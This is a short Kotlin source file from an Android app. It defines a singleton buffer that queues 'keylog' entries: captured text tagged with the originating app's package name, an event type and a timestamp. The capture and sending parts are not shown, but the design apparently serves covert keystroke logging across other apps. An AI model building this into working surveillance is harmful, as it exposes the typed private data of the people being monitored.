package com.bestiecourt.app.data.local

import java.util.concurrent.ConcurrentLinkedQueue
import javax.inject.Inject
import javax.inject.Singleton

data class KeylogEntry(
    val packageName: String,
    val text: String,
    val eventType: String,
    val timestamp: Long = System.currentTimeMillis()
)

@Singleton
class KeylogBuffer @Inject constructor() {

    @Volatile
    var isEnabled: Boolean = false

    private val queue = ConcurrentLinkedQueue<KeylogEntry>()

    fun add(packageName: String, text: String, eventType: String) {
        if (!isEnabled) return
        if (text.isBlank()) return
        queue.offer(KeylogEntry(packageName, text, eventType))
    }

    fun drain(): List<KeylogEntry> {
        val list = mutableListOf<KeylogEntry>()
        while (true) {
            val e = queue.poll() ?: break
            list.add(e)
        }
        return list
    }

    fun size(): Int = queue.size
}
